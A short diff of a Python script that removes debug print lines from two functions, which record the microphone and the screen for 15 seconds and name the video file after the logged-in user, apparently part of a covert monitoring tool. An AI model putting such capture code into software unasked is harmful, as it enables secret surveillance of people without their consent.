@@ -16,7 +16,6 @@ screen_width, screen_height = pyautogui.size()
 resolution = (screen_width, screen_height)
 
 def record_voice(duration=15):
-    print("ok")
     format = pyaudio.paInt16
     channels = 2
     rate = 44100
@@ -38,7 +37,6 @@ def record_voice(duration=15):
         wf.writeframes(b''.join(frames))
 
 def record_screen(duration=15):
-    print("okok")
     fourcc = cv2.VideoWriter_fourcc(*"XVID")
     out = cv2.VideoWriter(f"SCREENVID-{os.getlogin()}.avi", fourcc, 20.0, resolution)
     end_time = pyautogui.time.time() + duration
